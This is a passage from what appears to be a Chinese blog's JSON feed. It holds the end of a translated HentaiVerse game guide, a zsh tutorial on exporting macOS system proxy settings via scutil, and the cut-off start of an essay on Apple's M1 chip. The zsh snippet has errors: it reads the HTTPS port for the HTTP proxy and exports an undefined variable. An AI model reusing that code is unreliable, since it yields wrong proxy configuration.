href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a 